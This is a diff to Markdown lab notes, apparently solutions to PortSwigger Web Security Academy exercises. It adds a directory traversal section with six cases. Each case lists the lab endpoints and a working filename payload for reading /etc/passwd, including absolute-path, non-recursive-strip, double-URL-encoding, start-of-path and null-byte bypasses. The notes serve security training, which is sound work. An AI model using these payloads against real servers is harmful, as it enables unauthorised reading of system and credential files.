@@ -866,9 +866,73 @@
 
 ---
 
-<!--
-## **Directory Traversal**
+## **[Directory Traversal][directory_traversal]**
 
+1. #### **File path traversal, simple case**
+
+    ```plaintext
+    https://<lab_url>/product   GET   (productId=1)
+    https://<lab_url>/image     GET   (filename=10.jpg)
+
+    filename=../../../etc/passwd
+    ```
+
+2. #### **File path traversal, traversal sequences blocked with absolute path bypass**
+
+    ```plaintext
+    https://<lab_url>/product   GET   (productId=2)
+    https://<lab_url>/image     GET   (filename=20.jpg)
+
+    filename=/etc/passwd
+    ```
+
+3. #### **File path traversal, traversal sequences stripped non-recursively**
+
+    ```plaintext
+    https://<lab_url>/product   GET   (productId=3)
+    https://<lab_url>/image     GET   (filename=30.jpg)
+
+    v1: filename=....//....//....//etc/passwd
+    v2: filename=..././..././..././etc/passwd
+    ```
+
+4. #### **File path traversal, traversal sequences stripped with superfluous URL-decode**
+
+    ```plaintext
+    https://<lab_url>/product   GET   (productId=4)
+    https://<lab_url>/image     GET   (filename=40.jpg)
+
+    filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd                       (NO, URL encode)
+    filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                     (NO, semi-complete URL encode)
+    filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64   (NO, complete URL encode)
+
+    filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd    (OK, double URL encode)
+    ```
+
+5. #### **File path traversal, validation of start of path**
+
+    ```plaintext
+    https://<lab_url>/product   GET   (productId=5)
+    https://<lab_url>/image     GET   (filename=50.jpg)
+
+    filename=/var/www/images/../../../etc/passwd
+    ```
+
+6. #### **File path traversal, validation of file extension with null byte bypass**
+
+    ```plaintext
+    https://<lab_url>/product   GET   (productId=6)
+    https://<lab_url>/image     GET   (filename=60.jpg)
+
+    v1: filename=../../../etc/passwd%00.jpg
+    v2: filename=../../../etc/passwd%00.png
+    ```
+
+[directory_traversal]: https://portswigger.net/web-security/file-path-traversal
+
+---
+
+<!--
 ## **Command Injection**
 
 ## **Business Logic Vulnerabilities**
